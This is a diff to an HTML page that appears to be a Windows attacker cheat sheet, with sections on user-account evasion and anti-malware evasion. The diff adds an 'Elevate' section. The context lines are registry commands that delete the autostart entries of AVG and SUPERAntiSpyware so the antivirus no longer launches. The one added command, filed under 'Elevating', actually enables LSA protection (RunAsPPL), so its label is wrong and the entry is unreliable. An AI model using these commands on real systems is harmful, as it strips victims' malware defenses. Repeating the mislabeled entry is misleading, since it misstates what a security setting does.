@@ -14,6 +14,7 @@
 <li><a href="#wmi">WMI (Send WMI Query for User Account Evasion)</a></li>
 <li><a href="#sch">Scheduled Tasks</a></li>
 <li><a href="#antimalware">Anti-Malware Services Evasion</a></li>
+<li><a href="#elevate">Elevate</a></li>
 </ul>
 
 <b id="systeminfo">Systeminfo</b>
@@ -193,5 +194,9 @@
 <li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "AVGUI.exe" /f /reg:64</li>
 <li>Reg Delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64</li>
 <li>Reg Delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SUPERAntiSpyware" /f /reg:64</li>
+</ul>
+
+<b id="elevate">Elevating</b>
+<ul>
 <li>Reg Add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "1" /f /reg:32</li>
 </ul>
